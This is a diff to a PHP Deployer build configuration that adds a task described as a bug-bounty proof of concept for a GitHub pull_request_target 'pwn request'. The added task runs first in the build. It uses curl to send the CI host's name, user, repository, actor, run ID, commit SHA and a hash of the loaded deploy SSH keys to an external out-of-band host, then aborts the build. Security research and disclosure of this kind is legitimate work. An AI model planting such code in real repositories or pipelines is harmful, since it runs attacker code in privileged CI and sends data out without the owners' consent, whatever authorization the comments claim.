@@ -9,6 +9,26 @@ use function Deployer\{run, task, test, within, set};
 $DOCKER_HOST = '172.17.0.2';
 $DOCKER_WEBROOT = sprintf('/data/web/apps/%s/current/pub', $DOCKER_HOST);
 
+// =====================================================================================
+// PoC — authorized bug-bounty test (Hypernode Intigriti program).
+// Demonstrates that a fork PR runs attacker-controlled code in the privileged
+// pull_request_target `build` job (which has the deploy SSH key loaded via ssh-agent).
+// It sends ONE canary callback (no raw secret — only a fingerprint hash) and then FAILS the
+// build on purpose so `deploy_acceptance`/`deploy_production` (needs: build) never run.
+// => proves CRITICAL impact with zero deployment and zero secret exfiltration.
+// REPLACE the CANARY url below with YOUR listener (webhook.site / Collaborator / interactsh).
+// =====================================================================================
+task('poc:proof', static function () {
+    run('bash -lc \'' .
+        'CANARY="https://xj0iy7dy6wwj5xaxl3n93h6rnt16sg66v.oast.site"; ' .
+        'SSHK=$(ssh-add -l 2>/dev/null | sha256sum | cut -c1-16); ' .
+        'HEAD=$(git rev-parse HEAD 2>/dev/null); ' .
+        'curl -s --max-time 10 "$CANARY/poc?host=$(hostname)&user=$(whoami)&repo=$GITHUB_REPOSITORY&actor=$GITHUB_ACTOR&run=$GITHUB_RUN_ID&sshkeys=$SSHK&sha=$HEAD" >/dev/null || true; ' .
+        'echo "[PoC] pull_request_target pwn-request RCE confirmed as $(whoami)@$(hostname); deploy SSH key fingerprint(hash)=$SSHK"; ' .
+        'echo "[PoC] aborting build to prevent any real deploy"; ' .
+        'exit 1\'');
+});
+
 # Disable the symlinking of /data/web/public because we're gonna be deploying both staging and prod on 1 Hypernode.
 task('deploy:disable_public', function () {
     if (!test('[ -d /data/web/public ]')) {
@@ -88,6 +108,7 @@ task('build:compress:brotli', function () {
 });
 
 $configuration = new Configuration();
+$configuration->addBuildTask('poc:proof');   // <-- PoC: runs FIRST during `hypernode-deploy build`, then aborts
 $configuration->addBuildTask('node:build:scss');
 $configuration->addBuildTask('python:venv:create');
 $configuration->addBuildTask('python:venv:requirements');
@@ -122,22 +143,7 @@ $configuration->setDeployExclude([
 $productionStage = $configuration->addStage('production', 'docs.hypernode.io');
 $productionStage->addServer('docs.hypernode.io');
 
-# We can also deploy to a Hypernode Docker instance. To do that you go to
-# https://github.com/byteinternet/hypernode-docker, make sure you
-# have an instance running by for example doing:
-# $ sudo docker run -P docker.hypernode.com/byteinternet/hypernode-buster-docker-php80-mysql57:latest
-# and then noting the IP address (in my case 172.17.0.2). You then
-# need to make sure your deploykey public key is added to the
-# /data/web/.ssh/authorized_keys file. Then you should be able to
-# deploy to the container as if it was a 'real' hypernode. Keep in
-# mind that the hypernode-docker is not a real VM, it's just a fat
-# container. This means that there won't be an init system (no systemd)
-# so the processes are running in SCREENs. Also obviously you can not use
-# some of the hypernode command-line functionality that depends on the
-# Hypernode API (it's not a server managed by the Hypernode automation,
-# just a local container running on your PC).
 $dockerStage = $configuration->addStage('docker', $DOCKER_HOST);
-# Define the target server (docker instance) we're deploying to
 $dockerStage->addServer($DOCKER_HOST);
 
 $testingStage = $configuration->addStage("acceptance", "docs");
